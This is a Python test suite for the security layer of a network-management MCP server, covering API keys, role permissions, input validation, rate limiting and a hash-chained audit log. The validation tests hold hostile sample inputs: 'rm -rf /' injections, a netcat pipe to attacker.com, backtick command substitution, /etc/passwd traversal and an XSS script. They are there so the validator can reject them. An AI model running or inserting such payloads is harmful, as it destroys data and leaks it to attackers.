"""Tests for security infrastructure (authentication, authorization, validation, rate limiting, audit)."""

import json
import time

import pytest

from mcp_network.security import (
    AuthManager,
    APIKey,
    Role,
    Authorizer,
    InputValidator,
    ValidationError,
    RateLimiter,
    GlobalRateLimiter,
    CombinedRateLimiter,
    AuditLogger,
)


# ============================================================================
# Week 1: Authentication Tests
# ============================================================================

class TestAuthentication:
    """Tests for API key authentication."""

    def test_generate_key(self, tmp_path):
        """Test generating a new API key."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        plaintext, key = auth.generate_key(Role.OPERATOR, "Test key")

        assert plaintext.startswith("mcp_")
        assert key.role == Role.OPERATOR
        assert key.description == "Test key"
        assert key.enabled
        assert key.rate_limit == 120  # Default for operator

    def test_authenticate_valid_key(self, tmp_path):
        """Test authenticating with a valid key."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        plaintext, _ = auth.generate_key(Role.OPERATOR, "Test")

        authenticated = auth.authenticate(plaintext)
        assert authenticated is not None
        assert authenticated.role == Role.OPERATOR

    def test_authenticate_invalid_key(self, tmp_path):
        """Test that invalid keys are rejected."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        assert auth.authenticate("mcp_invalid_123_abc") is None

    def test_authenticate_wrong_secret(self, tmp_path):
        """Test that wrong secret is rejected."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        plaintext, _ = auth.generate_key(Role.OPERATOR, "Test")

        # Tamper with secret
        parts = plaintext.split("_")
        tampered = f"{parts[0]}_{parts[1]}_wrong_secret"

        assert auth.authenticate(tampered) is None

    def test_authenticate_expired_key(self, tmp_path):
        """Test that expired keys are rejected."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        plaintext, _ = auth.generate_key(
            Role.OPERATOR, "Test", expires_days=-1  # Already expired
        )

        assert auth.authenticate(plaintext) is None

    def test_authenticate_disabled_key(self, tmp_path):
        """Test that disabled keys are rejected."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        plaintext, key = auth.generate_key(Role.OPERATOR, "Test")

        # Disable key
        auth.revoke_key(key.key_id)

        assert auth.authenticate(plaintext) is None

    def test_revoke_key(self, tmp_path):
        """Test revoking a key."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        _, key = auth.generate_key(Role.OPERATOR, "Test")

        assert auth.revoke_key(key.key_id)
        assert not key.enabled

    def test_delete_key(self, tmp_path):
        """Test deleting a key."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        _, key = auth.generate_key(Role.OPERATOR, "Test")

        assert auth.delete_key(key.key_id)
        assert auth.get_key(key.key_id) is None

    def test_list_keys(self, tmp_path):
        """Test listing keys."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        auth.generate_key(Role.CONSUMER, "Key 1")
        auth.generate_key(Role.OPERATOR, "Key 2")

        keys = auth.list_keys()
        assert len(keys) == 2

    def test_list_keys_exclude_disabled(self, tmp_path):
        """Test that disabled keys are excluded by default."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        _, key1 = auth.generate_key(Role.CONSUMER, "Key 1")
        auth.generate_key(Role.OPERATOR, "Key 2")

        auth.revoke_key(key1.key_id)

        keys = auth.list_keys(include_disabled=False)
        assert len(keys) == 1

        keys = auth.list_keys(include_disabled=True)
        assert len(keys) == 2

    def test_persistence(self, tmp_path):
        """Test that keys persist across instances."""
        keys_file = tmp_path / "keys.json"

        # Create key with first instance
        auth1 = AuthManager(str(keys_file))
        plaintext, _ = auth1.generate_key(Role.OPERATOR, "Test")

        # Load with second instance
        auth2 = AuthManager(str(keys_file))
        authenticated = auth2.authenticate(plaintext)
        assert authenticated is not None

    def test_key_hash_not_reversible(self, tmp_path):
        """Test that plaintext cannot be recovered from hash."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        plaintext, key = auth.generate_key(Role.OPERATOR, "Test")

        # Hash should not contain plaintext
        assert plaintext not in key.key_hash
        assert len(key.key_hash) == 64  # SHA-256 hex

    def test_custom_rate_limit(self, tmp_path):
        """Test setting custom rate limit."""
        auth = AuthManager(str(tmp_path / "keys.json"))
        _, key = auth.generate_key(
            Role.OPERATOR, "Test", rate_limit=500
        )

        assert key.rate_limit == 500

    def test_role_hierarchy(self):
        """Test role comparison for hierarchy."""
        assert Role.CONSUMER < Role.OPERATOR
        assert Role.OPERATOR < Role.ADMIN
        assert Role.ADMIN < Role.SUPERUSER
        assert Role.CONSUMER <= Role.CONSUMER


# ============================================================================
# Week 1: Authorization Tests
# ============================================================================

class TestAuthorization:
    """Tests for role-based access control."""

    def test_consumer_cannot_access_operator_tools(self):
        """Test that consumers can't access operator tools."""
        auth = Authorizer()
        consumer_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.CONSUMER,
            created_at=time.time(),
            rate_limit=60,
        )

        assert not auth.can_access_tool(consumer_key, "run_command")
        assert not auth.can_access_tool(consumer_key, "diagnose_latency")

    def test_consumer_can_access_consumer_tools(self):
        """Test that consumers can access consumer tools."""
        auth = Authorizer()
        consumer_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.CONSUMER,
            created_at=time.time(),
            rate_limit=60,
        )

        assert auth.can_access_tool(consumer_key, "check_my_connection")
        assert auth.can_access_tool(consumer_key, "why_is_it_slow")

    def test_operator_inherits_consumer_tools(self):
        """Test that operators inherit consumer permissions."""
        auth = Authorizer()
        operator_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.OPERATOR,
            created_at=time.time(),
            rate_limit=120,
        )

        # Can access consumer tools
        assert auth.can_access_tool(operator_key, "check_my_connection")
        # Can access operator tools
        assert auth.can_access_tool(operator_key, "run_command")

    def test_admin_inherits_lower_roles(self):
        """Test that admins inherit all lower permissions."""
        auth = Authorizer()
        admin_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.ADMIN,
            created_at=time.time(),
            rate_limit=300,
        )

        assert auth.can_access_tool(admin_key, "check_my_connection")  # Consumer
        assert auth.can_access_tool(admin_key, "run_command")  # Operator
        assert auth.can_access_tool(admin_key, "start_agent")  # Admin

    def test_superuser_can_access_all(self):
        """Test that superusers can access everything."""
        auth = Authorizer()
        super_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.SUPERUSER,
            created_at=time.time(),
            rate_limit=600,
        )

        assert auth.can_access_tool(super_key, "create_api_key")

    def test_explicit_tool_allowlist(self):
        """Test explicit tool restrictions."""
        auth = Authorizer()
        restricted_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.ADMIN,
            created_at=time.time(),
            rate_limit=300,
            allowed_tools=["check_my_connection", "list_devices"],
        )

        assert auth.can_access_tool(restricted_key, "check_my_connection")
        assert auth.can_access_tool(restricted_key, "list_devices")
        assert not auth.can_access_tool(restricted_key, "start_agent")

    def test_device_access_unrestricted(self):
        """Test unrestricted device access."""
        auth = Authorizer()
        key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.OPERATOR,
            created_at=time.time(),
            rate_limit=120,
        )

        assert auth.can_access_device(key, "R1")
        assert auth.can_access_device(key, "R2")

    def test_device_access_restricted(self):
        """Test device access restrictions."""
        auth = Authorizer()
        restricted_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.OPERATOR,
            created_at=time.time(),
            rate_limit=120,
            allowed_devices=["R1", "R2"],
        )

        assert auth.can_access_device(restricted_key, "R1")
        assert not auth.can_access_device(restricted_key, "R3")

    def test_operator_cannot_run_config_commands(self):
        """Test that operators can only run show commands."""
        auth = Authorizer()
        operator_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.OPERATOR,
            created_at=time.time(),
            rate_limit=120,
        )

        # Allowed commands
        allowed, _ = auth.can_run_command(operator_key, "show version")
        assert allowed

        allowed, _ = auth.can_run_command(operator_key, "show interfaces")
        assert allowed

        # Denied commands
        allowed, reason = auth.can_run_command(operator_key, "configure terminal")
        assert not allowed
        assert "read-only" in reason.lower()

    def test_superuser_can_run_all_commands(self):
        """Test that superusers can run all commands."""
        auth = Authorizer()
        super_key = APIKey(
            key_id="test",
            key_hash="hash",
            role=Role.SUPERUSER,
            created_at=time.time(),
            rate_limit=600,
        )

        allowed, _ = auth.can_run_command(super_key, "configure terminal")
        assert allowed

        allowed, _ = auth.can_run_command(super_key, "reload")
        assert allowed


# ============================================================================
# Week 2: Input Validation Tests
# ============================================================================

class TestInputValidation:
    """Tests for input validation and sanitization."""

    def test_validate_device_id_valid(self):
        """Test valid device IDs."""
        validator = InputValidator()

        assert validator.validate_device_id("R1") == "R1"
        assert validator.validate_device_id("router-01") == "router-01"
        assert validator.validate_device_id("device_123") == "device_123"

    def test_validate_device_id_invalid(self):
        """Test invalid device IDs."""
        validator = InputValidator()

        with pytest.raises(ValidationError):
            validator.validate_device_id("../../../etc/passwd")

        with pytest.raises(ValidationError):
            validator.validate_device_id("device; rm -rf /")

        with pytest.raises(ValidationError):
            validator.validate_device_id("")

    def test_validate_destination_ip(self):
        """Test IP address validation."""
        validator = InputValidator()

        assert validator.validate_destination("192.168.1.1") == "192.168.1.1"
        assert validator.validate_destination("8.8.8.8") == "8.8.8.8"

    def test_validate_destination_hostname(self):
        """Test hostname validation."""
        validator = InputValidator()

        assert validator.validate_destination("google.com") == "google.com"
        assert validator.validate_destination("my-host.example.org") == "my-host.example.org"

    def test_validate_destination_invalid(self):
        """Test invalid destinations."""
        validator = InputValidator()

        with pytest.raises(ValidationError):
            validator.validate_destination("not a valid destination!")

        with pytest.raises(ValidationError):
            validator.validate_destination("host; rm -rf /")

    def test_validate_command_shell_injection(self):
        """Test rejection of shell injection attempts."""
        validator = InputValidator()

        with pytest.raises(ValidationError):
            validator.validate_command("show version; rm -rf /")

        with pytest.raises(ValidationError):
            validator.validate_command("show | nc attacker.com 1234")

        with pytest.raises(ValidationError):
            validator.validate_command("show `whoami`")

    def test_validate_command_path_traversal(self):
        """Test rejection of path traversal."""
        validator = InputValidator()

        with pytest.raises(ValidationError):
            validator.validate_command("cat ../../../etc/passwd")

    def test_validate_command_valid(self):
        """Test valid commands."""
        validator = InputValidator()

        assert validator.validate_command("show version") == "show version"
        assert validator.validate_command("  show interfaces  ") == "show interfaces"

    def test_validate_intent_injection(self):
        """Test intent validation against injection."""
        validator = InputValidator()

        with pytest.raises(ValidationError):
            validator.validate_intent("Zoom should be fast; rm -rf /")

        with pytest.raises(ValidationError):
            validator.validate_intent("Alert when {{config.password}}")

    def test_validate_intent_valid(self):
        """Test valid intents."""
        validator = InputValidator()

        assert validator.validate_intent("Zoom calls should never lag") == "Zoom calls should never lag"

    def test_validate_intent_too_long(self):
        """Test intent length limit."""
        validator = InputValidator()

        with pytest.raises(ValidationError):
            validator.validate_intent("A" * 501)

    def test_validate_positive_int(self):
        """Test positive integer validation."""
        validator = InputValidator()

        assert validator.validate_positive_int(42, "test") == 42
        assert validator.validate_positive_int("100", "test") == 100

        with pytest.raises(ValidationError):
            validator.validate_positive_int(0, "test")

        with pytest.raises(ValidationError):
            validator.validate_positive_int(-5, "test")

        with pytest.raises(ValidationError):
            validator.validate_positive_int("not a number", "test")

    def test_validate_port(self):
        """Test port validation."""
        validator = InputValidator()

        assert validator.validate_port(80) == 80
        assert validator.validate_port(8080) == 8080

        with pytest.raises(ValidationError):
            validator.validate_port(0)

        with pytest.raises(ValidationError):
            validator.validate_port(70000)

    def test_validate_role(self):
        """Test role validation."""
        validator = InputValidator()

        assert validator.validate_role("consumer") == "consumer"
        assert validator.validate_role("ADMIN") == "admin"  # Case insensitive

        with pytest.raises(ValidationError):
            validator.validate_role("invalid_role")

    def test_sanitize_output_xss(self):
        """Test XSS prevention in output."""
        validator = InputValidator()

        assert validator.sanitize_output("<script>alert('xss')</script>") == \
               "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;&#x2F;script&gt;"


# ============================================================================
# Week 3: Rate Limiting Tests
# ============================================================================

class TestRateLimiting:
    """Tests for token bucket rate limiter."""

    def test_allows_within_limit(self):
        """Test that requests within limit are allowed."""
        limiter = RateLimiter()

        # 60 requests/min = 1/sec, allow burst of 60
        for i in range(60):
            allowed, _ = limiter.check("test", limit=60)
            assert allowed, f"Request {i} should be allowed"

    def test_blocks_over_limit(self):
        """Test that requests over limit are blocked."""
        limiter = RateLimiter()

        # Use up all tokens
        for _ in range(60):
            limiter.check("test", limit=60)

        # Next request should be blocked
        allowed, retry_after = limiter.check("test", limit=60)
        assert not allowed
        assert retry_after > 0

    def test_tokens_refill_over_time(self):
        """Test that tokens refill after time passes."""
        limiter = RateLimiter()

        # Use up tokens
        for _ in range(60):
            limiter.check("test", limit=60)

        # Wait a bit (simulate 2 seconds = 2 tokens)
        limiter.buckets["test"].last_update -= 2.0

        # Should now allow 2 requests
        allowed, _ = limiter.check("test", limit=60)
        assert allowed

        allowed, _ = limiter.check("test", limit=60)
        assert allowed

        # Third should be blocked
        allowed, _ = limiter.check("test", limit=60)
        assert not allowed

    def test_separate_buckets_per_key(self):
        """Test that different keys have separate limits."""
        limiter = RateLimiter()

        # Fill key1
        for _ in range(60):
            limiter.check("key1", limit=60)

        # key1 blocked
        allowed, _ = limiter.check("key1", limit=60)
        assert not allowed

        # key2 still has tokens
        allowed, _ = limiter.check("key2", limit=60)
        assert allowed

    def test_get_remaining(self):
        """Test getting remaining requests."""
        limiter = RateLimiter()

        assert limiter.get_remaining("test", limit=60) == 60

        limiter.check("test", limit=60)
        remaining = limiter.get_remaining("test", limit=60)
        assert 58 <= remaining <= 60  # Approximate due to refill

    def test_reset(self):
        """Test resetting a limiter."""
        limiter = RateLimiter()

        # Use up tokens
        for _ in range(60):
            limiter.check("test", limit=60)

        # Reset
        limiter.reset("test")

        # Should be allowed again
        allowed, _ = limiter.check("test", limit=60)
        assert allowed


class TestGlobalRateLimiter:
    """Tests for global rate limiter."""

    def test_global_limit_enforced(self):
        """Test that global limit is enforced."""
        global_limiter = GlobalRateLimiter(global_limit=100)

        # Use up global quota
        for _ in range(100):
            allowed, _ = global_limiter.check()
            assert allowed

        # Next should be blocked
        allowed, retry = global_limiter.check()
        assert not allowed
        assert retry > 0


class TestCombinedRateLimiter:
    """Tests for combined per-key and global rate limiting."""

    def test_per_key_limit_enforced(self):
        """Test that per-key limit is checked first."""
        limiter = CombinedRateLimiter(global_limit=1000)

        # Use up key limit
        for _ in range(60):
            limiter.check("key1", key_limit=60)

        # Should be blocked by per-key limit
        allowed, reason, _ = limiter.check("key1", key_limit=60)
        assert not allowed
        assert "per-key" in reason.lower()

    def test_global_limit_enforced(self):
        """Test that global limit is checked."""
        limiter = CombinedRateLimiter(global_limit=10)

        # Use up global limit with different keys
        for i in range(10):
            limiter.check(f"key{i}", key_limit=100)

        # Next request blocked by global limit
        allowed, reason, _ = limiter.check("key999", key_limit=100)
        assert not allowed
        assert "global" in reason.lower()

    def test_get_stats(self):
        """Test getting rate limit statistics."""
        limiter = CombinedRateLimiter(global_limit=1000)

        stats = limiter.get_stats("test", key_limit=60)
        assert "key_remaining" in stats
        assert "global_remaining" in stats


# ============================================================================
# Week 3: Audit Logging Tests
# ============================================================================

class TestAuditLogging:
    """Tests for tamper-evident audit logging."""

    def test_log_event(self, tmp_path):
        """Test logging a basic event."""
        logger = AuditLogger(str(tmp_path))

        logger.log_tool_call(
            key_id="test_key",
            role="operator",
            tool="check_my_connection",
            params={},
            result="success",
        )

        # Check file was created
        log_files = list(tmp_path.glob("audit_*.jsonl"))
        assert len(log_files) == 1

    def test_chain_integrity(self, tmp_path):
        """Test that event chain is intact."""
        logger = AuditLogger(str(tmp_path))

        # Log several events
        for i in range(10):
            logger.log_tool_call(
                key_id="test",
                role="operator",
                tool=f"tool_{i}",
                params={},
                result="success",
            )

        # Verify chain
        log_file = list(tmp_path.glob("audit_*.jsonl"))[0]
        valid, error = logger.verify_chain(str(log_file))
        assert valid, error

    def test_detects_tampering(self, tmp_path):
        """Test that tampering is detected."""
        logger = AuditLogger(str(tmp_path))

        logger.log_tool_call(
            key_id="test",
            role="operator",
            tool="test_tool",
            params={},
            result="success",
        )

        # Tamper with log
        log_file = list(tmp_path.glob("audit_*.jsonl"))[0]
        content = log_file.read_text()
        tampered = content.replace("success", "failure")
        log_file.write_text(tampered)

        # Should detect tampering
        valid, error = logger.verify_chain(str(log_file))
        assert not valid
        assert error is not None

    def test_sanitizes_sensitive_params(self, tmp_path):
        """Test that sensitive parameters are redacted."""
        logger = AuditLogger(str(tmp_path))

        logger.log_tool_call(
            key_id="test",
            role="admin",
            tool="create_user",
            params={"username": "admin", "password": "secret123"},
            result="success",
        )

        # Read log
        log_file = list(tmp_path.glob("audit_*.jsonl"))[0]
        with open(log_file) as f:
            event = json.loads(f.read())

        # Password should be redacted
        assert event["parameters"]["password"] == "[REDACTED]"
        assert event["parameters"]["username"] == "admin"

    def test_search_by_key(self, tmp_path):
        """Test searching logs by key ID."""
        logger = AuditLogger(str(tmp_path))

        logger.log_tool_call("key1", "operator", "tool1", {}, "success")
        logger.log_tool_call("key2", "admin", "tool2", {}, "success")
        logger.log_tool_call("key1", "operator", "tool3", {}, "success")

        results = logger.search(key_id="key1")
        assert len(results) == 2
        assert all(e.key_id == "key1" for e in results)

    def test_search_by_result(self, tmp_path):
        """Test searching logs by result."""
        logger = AuditLogger(str(tmp_path))

        logger.log_tool_call("key1", "operator", "tool1", {}, "success")
        logger.log_tool_call("key1", "operator", "tool2", {}, "error")

        results = logger.search(result="error")
        assert len(results) == 1
        assert results[0].result == "error"

    def test_search_limit(self, tmp_path):
        """Test search result limiting."""
        logger = AuditLogger(str(tmp_path))

        for i in range(20):
            logger.log_tool_call("key1", "operator", f"tool{i}", {}, "success")

        results = logger.search(limit=5)
        assert len(results) == 5

    def test_log_auth_event(self, tmp_path):
        """Test logging authentication events."""
        logger = AuditLogger(str(tmp_path))

        logger.log_auth(
            key_id="test_key",
            role="operator",
            result="success",
            client_ip="127.0.0.1",
        )

        results = logger.search(event_type="auth")
        assert len(results) == 1
        assert results[0].event_type == "auth"

    def test_log_rate_limit_event(self, tmp_path):
        """Test logging rate limit events."""
        logger = AuditLogger(str(tmp_path))

        logger.log_rate_limit(
            key_id="test_key",
            reason="Per-key rate limit exceeded",
            retry_after=5.0,
        )

        results = logger.search(event_type="rate_limit")
        assert len(results) == 1
        assert results[0].result == "denied"
